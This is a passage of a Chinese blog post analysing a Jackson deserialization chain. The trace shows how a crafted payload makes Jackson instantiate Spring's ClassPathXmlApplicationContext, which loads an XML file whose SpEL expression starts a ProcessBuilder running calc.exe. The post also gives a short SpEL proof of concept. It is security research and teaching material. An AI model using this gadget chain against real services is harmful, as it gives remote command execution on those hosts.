        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>calc.exe<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>whatever<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123; pb.start() &#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710573314671-ef157a48-7a42-4e4f-8f46-c16d9c74aa9e.png#averageHue=%235f656d&clientId=uf4eba0d9-e83c-4&from=paste&height=518&id=ufa5ef229&originHeight=777&originWidth=1732&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=417801&status=done&style=none&taskId=u1ef081dc-a59a-477f-9402-eb92b13863b&title=&width=1154.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br><strong>注意一下 payload 的格式，不是正常的 json 格式，而是 [] 包括起来，之前我们做测试的时候，jackson 的字符串解析都会将 [] 包括的部分解析成具体实例化对象字段属性，属于字段属性 field，然后第一个参数是其类型，第二参数为类中的某个属性值，回忆起来这一点即可</strong><br>下面进入流程分析</p>
<h4 id="2x03-流程分析"><a href="#2x03-流程分析" class="headerlink" title="2x03 流程分析"></a>2x03 流程分析</h4><h5 id="3x01-objectMapper–初步处理解析"><a href="#3x01-objectMapper–初步处理解析" class="headerlink" title="3x01 objectMapper–初步处理解析"></a>3x01 objectMapper–初步处理解析</h5><p>断点打在 readValue 处<br>流程和工作流程差不多，但是由于 payload 的原因，objectMapper 会初步判断输入字符串的类型，然后调用不同的 deserialze 方法，依然是跟进到 <code>_readMapAndClose</code>方法处，然后继续调用 deserialze 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710573555671-e9f127f9-632d-4957-89ae-1621a9c59c3b.png#averageHue=%233d444e&clientId=uf4eba0d9-e83c-4&from=paste&height=711&id=udf467bfb&originHeight=1067&originWidth=1776&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=787212&status=done&style=none&taskId=u91364d77-4ad3-4669-8ca1-c24b3b2cd31&title=&width=1184" referrerpolicy="no-referrer" alt="image.png"><br>这里遇到的 deserialize 方法与我们之前遇到的有所不同，因为第一参数不同，我们给的是一个具体类参数类型的字符串，不是传统的 json 字符串，所以 objectMapper 这边会直接判断为我们在反序列化一个参数，并且它的类型是具体的类，所以会调用<code>deserialzeWithType</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710573658683-7109cec4-5afb-45e8-a3a2-2c8e5508fb56.png#averageHue=%234c5161&clientId=uf4eba0d9-e83c-4&from=paste&height=192&id=uc0d7589e&originHeight=288&originWidth=1501&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=154359&status=done&style=none&taskId=uab48cb5d-8d05-4d01-b2e3-721c78c0c90&title=&width=1000.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>直接跟进到了 deserialzeWithType，然后调用 typeDeserializer 的<code>deserializeTypedFromAny</code>，来解析我们输入的 json 内容<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710573699080-71332a1d-e10c-4ef7-8068-e04103a0adaf.png#averageHue=%23454c59&clientId=uf4eba0d9-e83c-4&from=paste&height=288&id=uefecad5f&originHeight=432&originWidth=1840&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=282779&status=done&style=none&taskId=u7c8c11e5-a3da-48ae-88bb-c6d91bdff30&title=&width=1226.6666666666667" referrerpolicy="no-referrer" alt="image.png"></p>
<p>然后我们一直往下跟进，到了 AsArrayTypeDeserializer 的 _deserialze 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710574373737-c054397a-7573-4824-9ac2-9f831f394e4c.png#averageHue=%233b414b&clientId=uf4eba0d9-e83c-4&from=paste&height=554&id=u215ae1c0&originHeight=831&originWidth=1726&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=591205&status=done&style=none&taskId=u7b63071b-4428-4845-99af-9cc0c071641&title=&width=1150.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710575274797-afd8e3a4-b125-4a53-a898-affc3b106a62.png#averageHue=%2331373e&clientId=uf4eba0d9-e83c-4&from=paste&height=358&id=XBCXA&originHeight=537&originWidth=1437&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=470024&status=done&style=none&taskId=u880c32d1-8866-4ed3-991f-1303ef93afe&title=&width=958" referrerpolicy="no-referrer" alt="image.png"><br>数据处理，然后将处理过后的字符串继续调用 deser.desrialize<br>这里又回到了熟悉的 beanDeserialzer<br>在 deserialize 方法中由于不和我们之前的正常的 json 字符串处理情况相同，这里会进入<code>_deserializeOther</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710575335256-fbfb49cd-51b6-4652-8f6f-00391c4fccfc.png#averageHue=%233e444f&clientId=uf4eba0d9-e83c-4&from=paste&height=445&id=u371a15ea&originHeight=667&originWidth=1366&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=360229&status=done&style=none&taskId=u2ec04593-8b9c-4061-9819-4b4bd589b9b&title=&width=910.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>又是一段 switch 判断，至于为什么会进 VALUE_STRING 的 case 情况，原因是一样的，jackson 中对于 [] 包裹的字符串内容自动辨别为类中属性值为具体类的特殊情况所以此时解析器认为我们是在解析类中属性值–VALUE_STRING<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710575431953-a4853e97-c171-48d5-9305-5bdb99402a6d.png#averageHue=%234b505e&clientId=uf4eba0d9-e83c-4&from=paste&height=166&id=ue0193a05&originHeight=249&originWidth=1639&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=182153&status=done&style=none&taskId=u656f9eac-df7d-4790-966a-700f3e71ad5&title=&width=1092.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>跟进到<code>VALUE_STRING</code>情况的<code>deserializeFromString</code>方法，来反序列化字符串的内容<br>最终调用了 createFromString 方法来创建实例化对象<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710576228178-138f6617-33ac-481e-8d81-595f47d5479a.png#averageHue=%233c424d&clientId=uf4eba0d9-e83c-4&from=paste&height=608&id=u1e0ad882&originHeight=912&originWidth=1775&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=615308&status=done&style=none&taskId=ue86ecee7-3072-4d08-96b6-1e720217094&title=&width=1183.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>继续跟进，首先会判断<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710576362729-9c449c56-c960-479d-9404-5997365ea0b2.png#averageHue=%23373e47&clientId=uf4eba0d9-e83c-4&from=paste&height=398&id=u4a1bc1df&originHeight=597&originWidth=1581&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=348487&status=done&style=none&taskId=uaf1bf494-28a2-4f0b-a6b0-8e7859d3a8e&title=&width=1054" referrerpolicy="no-referrer" alt="image.png"><br>首先会判断我们当前指定序列化的类是否有构造方法，如果有就不进 if 判断，进 trycatch 块</p>
<h5 id="3x02-CPX-有参构造触发"><a href="#3x02-CPX-有参构造触发" class="headerlink" title="3x02 CPX 有参构造触发"></a>3x02 CPX 有参构造触发</h5><p>开始调用其无参构造方法，其参数为我们指定 URI 的 spring.xml 配置文件的内容<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710576736402-25cd2279-1da9-49b8-8d27-faa9588639bd.png#averageHue=%234e5363&clientId=uf4eba0d9-e83c-4&from=paste&height=180&id=u0754ee4d&originHeight=270&originWidth=1408&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=132063&status=done&style=none&taskId=u62a1222c-8f0b-45bc-b54d-f60688c0e8e&title=&width=938.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>很自然的跟进到了 CPX 的有参构造方法中，这里调用父类的构造方法是为了给父类中参数赋值，然后继续跟进 refresh 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710577570204-4687a514-940e-4431-90dc-809a82882b0b.png#averageHue=%23464b57&clientId=uf4eba0d9-e83c-4&from=paste&height=241&id=u2d3d2703&originHeight=361&originWidth=1310&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=198738&status=done&style=none&taskId=u61bed50e-a6d7-429b-925d-3c6a264305e&title=&width=873.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>refresh 方法中有一个 invokeBeanFactoryPostProcessors 方法，它是用来处理 Spring.xml 这类配置文件中对于 bean 管理的方法，参数为我们指定的 IOC 容器地址，本地测试的话一般都是指定到了 resources 文件中<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710577654537-3dc7a05b-89b0-47ad-84e5-bc3104aa0b0e.png#averageHue=%233e4450&clientId=uf4eba0d9-e83c-4&from=paste&height=565&id=u75393678&originHeight=848&originWidth=1454&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=484070&status=done&style=none&taskId=u521efde1-68f5-4142-9bd9-4f5986ab760&title=&width=969.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>跟进，这又继续调用了<code>PostProcessorRegistrationDelegate</code>的<code> invokeBeanFactoryPostProcessors</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710578217830-03c1fa96-f7a6-4ce1-b30e-25e20b72b186.png#averageHue=%233b414c&clientId=uf4eba0d9-e83c-4&from=paste&height=685&id=ufc786bf0&originHeight=1027&originWidth=2415&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1063807&status=done&style=none&taskId=u6449d690-99a7-49b2-ac47-0c1aadc9f5b&title=&width=1610" referrerpolicy="no-referrer" alt="image.png"><br>在<code>invokeBeanFactoryPostProcessors</code>中，跟进到通过配置文件中 beanName 来获取类型之后存入 postProcessorNames 的操作<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710578307133-4ff2bc76-f5ae-42a8-8030-157c02e0144c.png#averageHue=%23444a57&clientId=uf4eba0d9-e83c-4&from=paste&height=202&id=u78cbf782&originHeight=303&originWidth=1677&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=201461&status=done&style=none&taskId=ud3db4bb8-931c-4278-8772-c5302c26f85&title=&width=1118" referrerpolicy="no-referrer" alt="image.png"><br>往下调用<code>doGetBeanNamesForType</code>真正开始获取 bean 的类型<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710578430546-aae75e18-05f6-4fc4-b953-ba3e98c63b83.png#averageHue=%23505768&clientId=uf4eba0d9-e83c-4&from=paste&height=169&id=u1f422efc&originHeight=254&originWidth=2115&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=214546&status=done&style=none&taskId=u797d8df4-cba6-4ec3-b059-6f7a15f1642&title=&width=1410" referrerpolicy="no-referrer" alt="image.png"><br>在<code>doGetBeanNamesForType</code>中具体解析的方法是 isFactoryBean 方法，它虽然返回值是布尔类型，但里面具体走的逻辑会把 bean 的信息都完成解析（根据方法名来说是在判断它是否是容器中的 bean）<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710578831430-756fb1f6-4fea-43fd-871e-6b77c0220295.png#averageHue=%23444b59&clientId=u8815f3df-d898-4&from=paste&height=260&id=uf3c726cf&originHeight=390&originWidth=1647&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=285968&status=done&style=none&taskId=uac37c599-1cc4-44ed-9a98-fcf4b29bf61&title=&width=1098" referrerpolicy="no-referrer" alt="image.png"><br>注意此时的 beanName 参数和 mbd 参数<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710578916666-b336f710-6cb3-43e5-90c4-386004000d18.png#averageHue=%233b414c&clientId=u8815f3df-d898-4&from=paste&height=606&id=uba6afa4f&originHeight=909&originWidth=2422&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=982722&status=done&style=none&taskId=ud994feae-d756-4fd2-9275-fca4c897131&title=&width=1614.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>跟进到<code>predictBeanType</code><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710579111578-15e34976-1ea4-4ee8-a9c9-565828ef4d49.png#averageHue=%23404651&clientId=u8815f3df-d898-4&from=paste&height=431&id=u97804c1e&originHeight=647&originWidth=1926&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=511102&status=done&style=none&taskId=ua8d212ca-fcc0-42ee-80f9-578c604b382&title=&width=1284" referrerpolicy="no-referrer" alt="image.png"><br>这里调用<code>determineTargetType</code>，开始解析操作<br>此时 targetType 为 null，也就是说暂时找不到我们当前想要的类型，进入 if 判断解析 beanclass<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710579729732-64486252-c67d-4f62-897e-2a0e8768914c.png#averageHue=%23363c45&clientId=u8815f3df-d898-4&from=paste&height=778&id=u4d037aef&originHeight=1167&originWidth=2380&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=1278099&status=done&style=none&taskId=u4f1969a9-88b4-4b60-bd2d-ba989795daa&title=&width=1586.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>跟进 <code>resolveBeanClass</code>到<code>doResolveBeanClass</code>的内容<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710579755416-766281eb-ba66-4ae5-b7a6-a7d431baf89f.png#averageHue=%23575d70&clientId=u8815f3df-d898-4&from=paste&height=125&id=u6b4a65bd&originHeight=187&originWidth=949&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=42441&status=done&style=none&taskId=u62a1980c-a581-4266-83fd-36da833b7bb&title=&width=632.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>首先获取 BeanClassLoader，然后获取 tempClassLoader，由于我们刚才获取到的所有 ClassLoader 都是 AppClassLoader，所以三个 if 循环最终还是会出来<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710579901218-19518cb8-05e6-4c5c-8490-ddec535f3d6c.png#averageHue=%233c424c&clientId=u8815f3df-d898-4&from=paste&height=652&id=ue3363718&originHeight=978&originWidth=1978&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=791833&status=done&style=none&taskId=u75f2c645-bea1-4869-b9be-3c24c350efd&title=&width=1318.6666666666667" referrerpolicy="no-referrer" alt="image.png"><br>直接调用到<code>evaluateBeanDefinitionString</code><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710579992404-7064d5c2-d308-45c1-97ad-7b3492aac90c.png#averageHue=%233f4550&clientId=u8815f3df-d898-4&from=paste&height=429&id=u533546f7&originHeight=643&originWidth=2163&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=483379&status=done&style=none&taskId=u41eccf18-4113-4b23-a445-fa064741191&title=&width=1442" referrerpolicy="no-referrer" alt="image.png"><br>此时观察变量表，我们已经获取到了 StandBeanExpressionResolver 了，也就是说已经装载好了相对应的 SeEL 表达式解析器了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710580162681-c813f69f-22cf-4ee6-9336-67dfd63faae1.png#averageHue=%2331383f&clientId=u8815f3df-d898-4&from=paste&height=255&id=ucd9e384c&originHeight=383&originWidth=1410&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=352178&status=done&style=none&taskId=u1d7caed6-fc4f-4f8a-943d-334b4b194eb&title=&width=940" referrerpolicy="no-referrer" alt="image.png">继续跟进，try 块中熟悉的 SpEL 表达式注入的味道，既然对 Expression 对象进行了获取，并且也对 SpEL 表达式进行了解析，那它必不可少绝对会有 getValue 去触发，果然在 try 块的最后进行了 getValue 操作<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1710580375795-1257c6c5-18d9-4550-869b-5fc2c9d183f1.png#averageHue=%233b414c&clientId=u8815f3df-d898-4&from=paste&height=499&id=HZK9a&originHeight=749&originWidth=1514&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=517592&status=done&style=none&taskId=u1f32ed63-c745-47b0-8431-949e19be617&title=&width=1009.3333333333334" referrerpolicy="no-referrer" alt="image.png"><br>SpEL 中基本的使用必须要有 SpEL 表达式的解析器，Expression 实体（用来存放解析器解析后的结果），如果有参数设置的需要，要用到 SpEL 的上下文<code>ParserContext</code>，这里我们肯定是需要的<br>重回我们写的 SpringXML 文件</p>
<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>
       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>
       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>cn<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>java.lang.ProcessBuilder<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>calc.exe<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>what<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#&#123; cn.start() &#125;<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>首先 PreocessBuilder 的有参构造是必须要有的，但是第二个<property>标签属性为什么需要呢？而且参数在<code>ProcessBuilder</code>并不需要，这里涉及 SpEL 表达式执行的流程（具体流程日后分析，个人猜测是 SpEL 表达式内容是单独获取到之后再单独执行）<br>类似于下面的 POC 同样的效果</property></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">EvaluationContext</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">Expression</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span></span><span class="token class-name">ExpressionParser</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>standard<span class="token punctuation">.</span></span><span class="token class-name">SpelExpressionParser</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>expression<span class="token punctuation">.</span>spel<span class="token punctuation">.</span>support<span class="token punctuation">.</span></span><span class="token class-name">StandardEvaluationContext</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ExpressionTest</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">ExpressionParser</span> parser <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SpelExpressionParser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Expression</span> expression <span class="token operator">=</span> parser<span class="token punctuation">.</span><span class="token function">parseExpression</span><span class="token punctuation">(</span><span class="token string">"new java.lang.ProcessBuilder(new String[]&#123;\"calc\"&#125;).start()"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//EvaluationContext context = new StandardEvaluationContext();</span>
        <span class="token comment">//context.setVariable("end", "~");</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>expression<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">//System.out.println(expression.getValue(context));</span>
    <span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/03/08/65ea7ca64ea9f.png" title="头像" alt="头像"></a><div class="post-copyright__author_name">stoocea</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/post/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/post/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html')">Jackson反序列化初步学习</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://example.com/post/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=Jackson反序列化初步学习&amp;url=http://example.com/post/Jackson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.html&amp;pic=https://bu.dusays.com/2024/03/11/65ee76f777226.jpg" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
